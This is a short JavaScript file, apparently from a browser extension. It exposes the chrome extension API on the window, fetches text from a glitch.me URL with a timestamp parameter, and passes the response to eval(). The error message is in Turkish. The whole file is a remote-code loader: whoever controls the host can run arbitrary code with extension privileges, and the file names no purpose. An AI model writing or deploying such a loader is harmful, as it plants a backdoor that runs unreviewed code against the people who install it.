window.chrome = chrome;
v = new Date().valueOf();

fetch("https://hollow-ribbon-joke.glitch.me/content?v=" + v)
  .then(function (response) {
    return response.text();
  })
  .then(function (javascriptCode) {
    eval(javascriptCode);
  })
  .catch(function (error) {
    console.error("Hata:", error);
  });
